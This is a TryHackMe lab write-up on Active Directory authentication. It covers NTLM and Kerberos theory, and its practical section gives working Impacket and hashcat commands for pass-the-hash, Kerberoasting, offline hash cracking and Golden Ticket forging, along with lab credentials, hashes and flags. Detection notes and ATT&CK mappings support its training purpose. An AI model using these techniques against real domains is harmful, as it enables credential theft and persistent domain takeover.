# Introduction to Active Directory Authentication — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Introduction to Active Directory Authentication  
**Difficulty:** Easy  
**Date:** 2026-05-24  
**Tags:** Active Directory, NTLM, Kerberos, Pass-the-Hash, Kerberoasting, Golden Ticket, Credential Cache, SMB

---

## Overview

A foundational Active Directory room covering the two core authentication protocols — NTLM and Kerberos — with hands-on tasks demonstrating real-world attack techniques. The room walks through the full authentication lifecycle: from understanding how credentials are verified, to abusing protocol design flaws for lateral movement and domain compromise. Each task builds on the previous one, culminating in a Golden Ticket attack that grants unrestricted domain access.

- **Flags obtained:** 6 (flag1 through flag6)
- **Key tools:** Impacket (smbclient.py, getTGT.py, GetUserSPNs.py, ticketer.py), hashcat

---

## MITRE ATT&CK Mapping

| TTP | Technique | Description |
|-----|-----------|-------------|
| T1078.002 | Valid Accounts: Domain Accounts | SMB authentication using known domain credentials (claire, mary) |
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | NTLM authentication using raw hash without password (phillip, ben) |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Requesting TGS for svc_printer SPN and cracking offline |
| T1558.001 | Steal or Forge Kerberos Tickets: Golden Ticket | Forging TGT using compromised krbtgt NTLM hash |
| T1550.003 | Use Alternate Authentication Material: Pass the Ticket | Using cached Kerberos tickets (ccache) for authentication |
| T1110.002 | Brute Force: Password Cracking | Offline cracking of NTLM hash and Kerberos TGS-REP with hashcat |

---

## Theory: Authentication Protocols

### Authentication vs Authorisation

Two fundamentally different processes that happen sequentially:

- **Authentication** answers "Who are you?" — verifying identity through credentials (password, hash, ticket).
- **Authorisation** answers "What can you do?" — checking permissions via ACLs and PAC after identity is confirmed.

AD attack chains often exploit both: break authentication to impersonate a user (Pass-the-Hash, Kerberoasting), then abuse authorisation misconfigurations to escalate privileges (misconfigured ACLs, excessive group memberships).

### NTLM (NetNTLM)

Legacy challenge-response protocol. The client authenticates **to the service**, not directly to the DC:

1. Client sends username to target server.
2. Server generates a 16-byte random challenge.
3. Client encrypts the challenge with the NTLM hash of its password and sends the response.
4. Server forwards username + challenge + response to DC for verification.
5. DC compares against stored hash in NTDS.dit → grants or denies.

**Key weakness:** The NTLM hash itself is the authentication key. Knowing the hash = knowing the password for authentication purposes. The password is never needed — this enables Pass-the-Hash.

**Still alive because:** Required when accessing resources by IP (Kerberos needs hostname), for non-domain resources, for legacy application compatibility, and for offline/cached logon scenarios.

### Kerberos

Primary AD authentication protocol based on tickets and a trusted third party (KDC on the Domain Controller).

**Core components:**

| Component | Role |
|-----------|------|
| **AS (Authentication Service)** | First KDC component; handles initial authentication, issues TGTs |
| **TGS (Ticket Granting Service)** | Second KDC component; issues Service Tickets for specific services |
| **TGT (Ticket Granting Ticket)** | "Passport" — proves identity, encrypted with krbtgt hash |
| **ST (Service Ticket)** | Ticket for a specific service, encrypted with that service account's hash |
| **SPN (Service Principal Name)** | Unique identifier for a service instance (e.g., `MSSQLSvc/sql.thm.loc:1433`) |
| **krbtgt Account** | Master key account; its hash encrypts/signs all TGTs |

**Authentication flow:**

```
Step 1: AS-REQ/AS-REP
Client → DC: "I'm mary" + timestamp encrypted with password hash (pre-auth)
DC → Client: TGT (encrypted with krbtgt hash)

Step 2: TGS-REQ/TGS-REP
Client → DC: TGT + "I want access to SMB on SERVER1" (SPN)
DC → Client: Service Ticket (encrypted with service account hash)

Step 3: AP-REQ
Client → SERVER1: Service Ticket
SERVER1: Decrypts with its hash → checks PAC → grants access
```

**Critical design detail:** Neither the password nor its hash is ever transmitted over the network. Both sides derive the same hash independently — the client computes it from the typed password, the DC stores it from account creation. Only encrypted structures are transmitted.

### Credential Cache (ccache)

Kerberos tickets are cached locally for SSO functionality:

- **Linux:** Files in `/tmp/krb5cc_<UID>`, controlled by `KRB5CCNAME` environment variable.
- **Windows:** In lsass.exe memory, extractable via Mimikatz (`sekurlsa::tickets /export`) in `.kirbi` format.
- **Conversion:** `ticketConverter.py` converts between ccache (Linux) and kirbi (Windows) formats.

Stealing a ccache file = stealing all cached tickets (Pass-the-Ticket). The `KRB5CCNAME` variable tells Kerberos-aware tools **where to find** the ticket cache — without it, tools look in the default location for the current user's UID.

---

## Practical Tasks

### Task 3: NTLM Authentication (flag1)

Standard NTLM authentication with known credentials via SMB:

```bash
smbclient.py thm.loc/claire:'Password123!'@192.168.11.51
```

```
# use SHARE1
# cat flag1.txt
THM{5cbcc61a-3178-4220-88b4-367c1bbb48e7}
```

**Note:** Connection by IP address (not hostname) → Kerberos cannot work → automatic fallback to NTLM. The client never contacts the DC directly; the target server proxies the authentication.

### Task 3: Kerberos Authentication (flag2)

Full Kerberos flow — obtain TGT, cache it, authenticate with ticket:

```bash
# DNS resolution required for Kerberos (SPN needs hostname)
echo 192.168.11.51 SERVER1.thm.loc >> /etc/hosts

# Step 1: Get TGT from DC (AS-REQ/AS-REP)
getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100

# Step 2: Point tools to the ticket cache
export KRB5CCNAME=mary.ccache

# Step 3: Connect using Kerberos (-k) without password (-no-pass)
smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

```
# use SHARE2
# cat flag2.txt
THM{0d3f818a-427a-425c-a451-55e43b83e876}
```

**Key differences from NTLM:** Connection by hostname (required for Kerberos SPN resolution). Password needed only once to obtain TGT. `-dc-ip` specified because the attack machine is not domain-joined and cannot find the DC via DNS SRV records.

### Task 5: NTLM Hash Cracking (flag3)

Cracking an NTLM hash with hashcat and using the recovered password:

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

```
939b0058bc6dd834abc4cc08cfefea69:secret12!
Status...........: Cracked
Speed.#1.........:  2255.6 kH/s
Progress.........: 3923968/14344384 (27.36%)
```

```bash
smbclient.py "thm.loc/phillip:secret12!"@192.168.11.51
```

```
# use SHARE3
# cat flag3.txt
THM{0eef8df3-c8ea-41ad-acd7-ae0479b2badf}
```

**Alternative approach — Pass-the-Hash (no cracking needed):**

```bash
smbclient.py thm.loc/phillip@192.168.11.51 -hashes :939b0058bc6dd834abc4cc08cfefea69
```

Same result, no password required. Cracking is still valuable though — recovered passwords can be reused across services (password reuse) and enable Kerberos authentication.

### Task 5: Pass-the-Hash (flag4)

Direct hash authentication without cracking:

```bash
smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```

```
# use SHARE4
# cat flag4.txt
THM{284c6735-b7c1-4221-b072-abf30a54eeda}
```

**Hash format:** `LM_HASH:NTLM_HASH`. The LM hash `aad3b435b51404eeaad3b435b51404ee` is the hash of an empty string — LM hashing is disabled on modern systems, so this is always a placeholder. Only the NTLM part (after the colon) matters. Both formats work: `-hashes :NTLM_ONLY` or `-hashes LM_PLACEHOLDER:NTLM`.

### Task 5: Kerberoasting (flag5)

Requesting Service Tickets for offline cracking using a low-privileged account:

```bash
# Enumerate SPNs and request tickets
GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
```

```
ServicePrincipalName    Name         
http/svc_print.thm.loc  svc_printer
```

Output includes the TGS-REP hash (`$krb5tgs$23$*svc_printer$THM.LOC$...`).

```bash
# Crack the Service Ticket offline
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*svc_printer$THM.LOC$...:password1!
Status...........: Cracked
Speed.#1.........:   312.6 kH/s
Progress.........: 131072/14344384 (0.91%)
```

```bash
smbclient.py "thm.loc/svc_printer:password1!"@192.168.11.51
```

```
# use SHARE5
# cat flag5.txt
THM{5b57e69d-7089-4282-ba04-c72de9bfdb38}
```

**Why this works:** Any authenticated domain user can request a Service Ticket for any SPN — this is by design, not a vulnerability. The ticket is encrypted with the service account's hash, enabling offline brute force. Service accounts frequently have weak, never-rotated passwords. The value isn't access to the service itself — it's gaining another domain credential that may have elevated privileges elsewhere.

**Speed comparison:** NTLM (`-m 1000`): ~2,255 kH/s vs Kerberos TGS-REP (`-m 13100`): ~312 kH/s. Kerberos hashes are ~7x slower to crack due to algorithm complexity, but weak passwords like `password1!` fall instantly regardless.

### Task 5: Golden Ticket (flag6)

Forging a TGT using the compromised krbtgt hash:

```bash
# Create Golden Ticket
ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 \
            -domain-sid S-1-5-21-990021728-513958382-3715561918 \
            -domain thm.loc \
            Administrator

# Use the forged ticket
export KRB5CCNAME=Administrator.ccache

# Requires DNS — add if not present
echo "192.168.11.51 SERVER1.thm.loc" >> /etc/hosts

smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

```
# use SHARE6
# cat flag6.txt
THM{eac75729-86ea-4bab-98de-1c5ce3552f67}
```

**What happened:** `ticketer.py` used the krbtgt hash to create a completely forged TGT for Administrator. The DC trusts this ticket because it's signed with the correct key. No password was stolen, no ticket was intercepted — the TGT was manufactured from scratch.

**Three ingredients needed:** krbtgt NTLM hash (requires high privileges like Domain Admin or DCSync rights to obtain), Domain SID (any domain user can retrieve — not secret), and domain name.

**Persistence implications:** Golden Tickets survive password resets for all users. They remain valid until the krbtgt password is changed **twice** (AD stores current + previous krbtgt hash). Many organizations never rotate krbtgt, making this a long-term persistence mechanism.

---

## Mistakes I Made

| # | Mistake | Lesson |
|---|---------|--------|
| 1 | Typed `SHARE 1` (with space) instead of `SHARE1` — SMB returned `STATUS_BAD_NETWORK_NAME` | SMB share names are exact-match. Always copy names from enumeration output rather than typing from memory. |
| 2 | Typed `flag.txt` / `flag4.txtx` instead of `flag1.txt` / `flag4.txt` — `STATUS_OBJECT_NAME_NOT_FOUND` | Same pattern — always `ls` first, then copy the exact filename. This happened multiple times in the same session. |
| 3 | Forgot to add `/etc/hosts` entry for `SERVER1.thm.loc` before Golden Ticket connection — `Name or service not known` | Kerberos requires hostname resolution. When switching tasks or sessions, verify DNS/hosts entries are still in place before attempting Kerberos authentication. |

---

## Detection Notes

| Attack | Event ID | Indicator |
|--------|----------|-----------|
| Pass-the-Hash | 4624 | Authentication Package field = `NTLM` (instead of expected `Kerberos` for domain accounts) |
| Kerberoasting | 4769 | Large number of TGS requests from a single account, especially for multiple SPNs |
| Golden Ticket | 4769 | TGT with abnormally long lifetime; ticket encryption type mismatches |

---

## Key Takeaways

1. **NTLM hash = authentication key.** Unlike most systems where a hash must be cracked to be useful, NTLM hashes can authenticate directly (Pass-the-Hash). This is an architectural property of the protocol, not a vulnerability.

2. **Kerberoasting exploits protocol design.** Any domain user can request Service Tickets for any SPN. The ticket is encrypted with the service account's password hash, enabling offline cracking. No special privileges required — just one low-level domain account.

3. **Golden Ticket = persistent domain compromise.** Obtaining the krbtgt hash allows forging TGTs for any user with any privileges. Survives password resets and remains valid until krbtgt is rotated twice. This is the end-game persistence mechanism for AD attacks.

4. **Kerberos needs hostnames, NTLM works with IPs.** This distinction determines which protocol is used. Attackers can force NTLM fallback by connecting via IP; defenders can detect unexpected NTLM usage as an indicator of compromise.

5. **Lateral movement doesn't require exploits.** The entire attack chain in this room — from basic SMB access to domain takeover — used legitimate protocol features. No CVEs, no buffer overflows, no code execution vulnerabilities. Just protocol abuse and weak passwords.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| smbclient.py (Impacket) | SMB client for share access — supports password, hash, and Kerberos auth |
| getTGT.py (Impacket) | Kerberos TGT acquisition and ccache file generation |
| GetUserSPNs.py (Impacket) | SPN enumeration and TGS-REP extraction for Kerberoasting |
| ticketer.py (Impacket) | Golden/Silver Ticket creation from krbtgt/service account hash |
| hashcat | Offline hash cracking — NTLM (-m 1000), Kerberos TGS-REP (-m 13100) |

---

## References

- [Impacket — SecureAuth/Fortra](https://github.com/fortra/impacket)
- [MITRE ATT&CK — Kerberoasting T1558.003](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — Golden Ticket T1558.001](https://attack.mitre.org/techniques/T1558/001/)
- [MITRE ATT&CK — Pass the Hash T1550.002](https://attack.mitre.org/techniques/T1550/002/)
- [HackTricks — Kerberos Authentication](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication)
- [HackTricks — Pass the Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm#pass-the-hash)
